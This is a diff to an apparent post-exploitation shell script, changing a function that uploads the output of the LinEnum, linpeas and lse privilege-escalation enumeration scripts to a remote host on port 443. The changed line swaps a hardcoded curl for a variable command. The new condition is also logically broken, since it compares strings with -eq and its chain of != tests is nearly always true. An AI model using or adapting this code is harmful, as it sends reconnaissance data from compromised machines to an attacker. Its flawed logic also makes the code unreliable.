@@ -146,16 +146,16 @@ execute()
 # Exfiltrate enum script results
 exfiltrate()
 {
-	if [ $dload -eq "curl" ] ; then
+	if [ $dload -eq "curl" ] || [  $dload != "wget" ] || [  $dload != "null" ]; then
 		files=("LinEnum.sh.txt" "linpeas.sh.txt" "lse.sh.txt")
 	
 		for file in "${files[@]}"
 		do
 			echo -e "\n#### Exfiltrating: $file ####\n" 
-			curl -F "data=@$file" $1:443
+			$dload -F "data=@$file" $1:443
 		done
 	else
-		echo -e "\n### Curl not found. Exfiltrate manually ###\n"
+		echo -e "\n### command not specified. Exfiltrate manually ###\n"
 	fi
 }
 
